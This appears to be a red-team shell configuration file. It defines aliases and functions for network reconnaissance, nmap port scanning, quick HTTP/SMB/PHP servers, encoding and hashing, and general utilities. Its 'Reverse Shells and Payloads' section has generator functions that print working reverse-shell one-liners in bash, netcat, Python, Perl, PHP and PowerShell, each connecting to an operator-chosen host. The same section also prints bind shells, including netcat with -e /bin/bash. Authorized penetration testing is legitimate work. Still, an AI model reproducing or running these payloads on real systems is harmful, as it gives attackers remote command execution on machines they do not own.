# Red Team Tools and Functions
# Specialized commands for security testing and red team operations

# ============================================================================
# Network Reconnaissance
# ============================================================================

# IP Address Information
alias myip='curl -s ifconfig.me'
alias ports='netstat -tuln'
alias listening='netstat -an | grep LISTEN'

# Generic local IP (works on both macOS and Linux)
localip() {
    # Try macOS method first
    local ip=$(ipconfig getifaddr en0 2>/dev/null)
    if [[ -z "$ip" ]]; then
        # Fall back to Linux method
        ip=$(ip route get 1 2>/dev/null | awk '{print $7}' | head -1)
    fi
    if [[ -z "$ip" ]]; then
        echo "Unable to determine local IP"
        return 1
    fi
    echo "$ip"
}

# Network information gathering
netinfo() {
    echo "=== Network Information ==="
    echo "External IP: $(curl -s ifconfig.me 2>/dev/null || echo 'Unable to fetch')"
    echo "Local IP: $(localip)"
    
    # Platform-specific gateway detection
    if [[ "$OSTYPE" == darwin* ]]; then
        echo "Gateway: $(route -n get default 2>/dev/null | grep gateway | awk '{print $2}' || echo 'Unknown')"
        echo "DNS Servers: $(scutil --dns 2>/dev/null | grep nameserver | awk '{print $3}' | sort -u | tr '\n' ' ' || echo 'Unknown')"
    else
        echo "Gateway: $(ip route | grep default | awk '{print $3}' | head -1 || echo 'Unknown')"
        echo "DNS Servers: $(cat /etc/resolv.conf 2>/dev/null | grep nameserver | awk '{print $2}' | tr '\n' ' ' || echo 'Unknown')"
    fi
}

# Show tun0 IP (for VPN contexts)
get_tun0_ip() {
    ip addr show tun0 2>/dev/null | awk '/inet / {print $2}' | cut -d/ -f1
}

# ============================================================================
# Port Scanning and Network Testing
# ============================================================================

# Quick port scanner using nmap
quickscan() {
    if [[ -z "$1" ]]; then
        echo "Usage: quickscan <target>"
        echo "Example: quickscan 192.168.1.1"
        return 1
    fi
    nmap -T4 -F "$1"
}

# Comprehensive port scan
alias nmap-top-ports='nmap -sV -sC --top-ports=1000'

# TCP SYN scan with service detection
tcpscan() {
    if [[ -z "$1" ]]; then
        echo "Usage: tcpscan <target> [ports]"
        echo "Example: tcpscan 192.168.1.1 80,443,22"
        return 1
    fi
    local target="$1"
    local ports="${2:-1-65535}"
    nmap -sS -sV -p "$ports" "$target"
}

# UDP scan for common services
udpscan() {
    if [[ -z "$1" ]]; then
        echo "Usage: udpscan <target>"
        echo "Example: udpscan 192.168.1.1"
        return 1
    fi
    nmap -sU --top-ports=100 "$1"
}

# ============================================================================
# Web Services and Servers
# ============================================================================

# HTTP servers
alias webserver='python3 -m http.server 8080'
alias http-server='python3 -m http.server'

# HTTPS server (requires cert.pem and key.pem)
alias https-server='python3 -m http.server --cert-file=cert.pem --key-file=key.pem'

# SMB server for file sharing
alias smbserver='impacket-smbserver share . -smb2support'

# PHP server
phpserver() {
    local port="${1:-8000}"
    php -S "0.0.0.0:$port"
}

# ============================================================================
# Encoding and Decoding Utilities
# ============================================================================

# Base64 encoding/decoding
function base64encode() { echo -n "$1" | base64; }

# URL encoding/decoding
alias urlencode='python3 -c "import sys, urllib.parse as ul; print(ul.quote_plus(sys.argv[1]))"'
alias urldecode='python3 -c "import sys, urllib.parse as ul; print(ul.unquote_plus(sys.argv[1]))"'

# ROT13 cipher
alias rot13='tr a-zA-Z n-za-mN-ZA-M'

# Hex dump utilities
alias hexdump='xxd'
alias strings='strings -a'

# Hash generation
md5hash() { echo -n "$1" | md5sum | awk '{print $1}'; }
sha1hash() { echo -n "$1" | sha1sum | awk '{print $1}'; }
sha256hash() { echo -n "$1" | sha256sum | awk '{print $1}'; }

# ============================================================================
# Reverse Shells and Payloads
# ============================================================================

# Generate reverse shell one-liners
rev-shell() {
    if [[ $# -ne 3 ]]; then
        echo "Usage: rev-shell <type> <lhost> <lport>"
        echo "Types: bash, nc, python, perl, php, powershell"
        echo "Example: rev-shell bash 192.168.1.100 4444"
        return 1
    fi

    local type="$1"
    local lhost="$2" 
    local lport="$3"

    case "$type" in
        bash)
            echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
            ;;
        nc)
            echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
            ;;
        python)
            echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            ;;
        perl)
            echo "perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
            ;;
        php)
            echo "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            ;;
        powershell)
            echo "\$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCiiEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
            ;;
        *)
            echo "Unknown shell type: $type"
            echo "Available types: bash, nc, python, perl, php, powershell"
            return 1
            ;;
    esac
}

# Bind shell generator
bind-shell() {
    if [[ $# -ne 2 ]]; then
        echo "Usage: bind-shell <type> <lport>"
        echo "Types: bash, nc, python"
        echo "Example: bind-shell nc 4444"
        return 1
    fi

    local type="$1"
    local lport="$2"

    case "$type" in
        bash)
            echo "bash -i >& /dev/tcp/0.0.0.0/$lport 0>&1"
            ;;
        nc)
            echo "nc -nlvp $lport -e /bin/bash"
            ;;
        python)
            echo "python -c 'import socket,subprocess;s=socket.socket();s.bind((\"0.0.0.0\",$lport));s.listen(1);conn,addr=s.accept();subprocess.call([\"/bin/sh\"],stdin=conn.fileno(),stdout=conn.fileno(),stderr=conn.fileno())'"
            ;;
        *)
            echo "Unknown shell type: $type"
            return 1
            ;;
    esac
}

# ============================================================================
# Utility Functions
# ============================================================================

# Extract various archive types
extract() {
    if [[ -f $1 ]]; then
        case $1 in
            *.tar.bz2)   tar xjf "$1"     ;;
            *.tar.gz)    tar xzf "$1"     ;;
            *.tar.xz)    tar xJf "$1"     ;;
            *.bz2)       bunzip2 "$1"     ;;
            *.rar)       unrar e "$1"     ;;
            *.gz)        gunzip "$1"      ;;
            *.tar)       tar xf "$1"      ;;
            *.tbz2)      tar xjf "$1"     ;;
            *.tgz)       tar xzf "$1"     ;;
            *.zip)       unzip "$1"       ;;
            *.Z)         uncompress "$1"  ;;
            *.7z)        7z x "$1"        ;;
            *)           echo "'$1' cannot be extracted via extract()" ;;
        esac
    else
        echo "'$1' is not a valid file"
    fi
}

# Find files containing specific text
findtext() {
    if [[ -z "$1" ]]; then
        echo "Usage: findtext <search_term> [directory]"
        echo "Example: findtext 'password' /var/log"
        return 1
    fi
    local dir="${2:-.}"
    grep -r "$1" "$dir" 2>/dev/null
}

# Generate random strings
randstring() {
    local length="${1:-16}"
    head /dev/urandom | tr -dc A-Za-z0-9 | head -c "$length"
    echo
}

# Process monitoring
psgrep() {
    if [[ -z "$1" ]]; then
        echo "Usage: psgrep <process_name>"
        return 1
    fi
    ps aux | grep "$1" | grep -v grep
}